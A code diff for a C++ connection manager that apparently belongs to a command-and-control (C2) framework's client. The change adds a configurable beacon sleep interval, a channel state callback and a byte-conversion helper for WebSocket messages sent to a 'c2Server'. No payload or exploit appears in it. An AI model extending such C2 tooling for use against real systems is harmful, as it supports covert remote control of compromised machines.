@@ -3,13 +3,15 @@
 //
 
 #include "ConnectionsManager.h"
+#include "CoreUtils.h"
 #include <utility>
 
 
 ConnectionConfig::ConnectionConfig(
         std::string connectionId,
-        std::string endpoint
-        ) : connectionId(std::move(connectionId)), endpoint(std::move(endpoint)) {}
+        std::string endpoint,
+        std::uint16_t sleep
+        ) : connectionId(std::move(connectionId)), endpoint(std::move(endpoint)), sleep(sleep) {}
 
 std::string ConnectionConfig::getUrl() const {
     return "ws://" + c2server + '/' + endpoint + '/' + connectionId;
@@ -25,10 +27,15 @@ ConnectionsManager::ConnectionsManager(ConnectionConfig config) : config(std::mo
             [](){
                 std::cout << "c2Server channel opened" << std::endl;
                 },
-            [this](std::vector<std::byte> data){
+            [this](auto data){
                 handleC2ServerMessage(data);
                 },
-                60
+            [this](ChannelState state, std::uint64_t time){
+                    if(onC2StateChange != nullptr){
+                        onC2StateChange(state == ChannelState::OPENED, CoreUtils::convert(state), time);
+                    }
+                },
+                this->config.sleep
             );
     c2ServerChannel = std::make_unique<C2ServerChannel>(cfg);
 }
@@ -78,22 +85,15 @@ void ConnectionsManager::handleC2ServerMessage(std::vector<std::byte> &data) {
 
 void ConnectionsManager::send(const msgs::ControlPacket& data) {
 
-    // step 1: create network message
     msgs::NetworkMessage message{};
     message.mutable_control()->CopyFrom(data);
 
-    // step 2: serialize network message
     const std::string serializedString = message.SerializeAsString();
-    std::vector<std::byte> bytes;
-    bytes.reserve(serializedString.size());
+    c2ServerChannel->send(CoreUtils::convert(serializedString));
+}
 
-    std::transform(
-            std::begin(serializedString),
-            std::end(serializedString),
-            std::back_inserter(bytes),
-            [](char byteChar){ return std::byte(byteChar);
-    });
 
-    // step 3: send serialized data
-    c2ServerChannel->send(bytes);
+void ConnectionsManager::setC2StateChangeCallback(
+        const std::function<void(bool, std::string, std::uint64_t)> &pOnC2StateChange) {
+    this->onC2StateChange = pOnC2StateChange;
 }
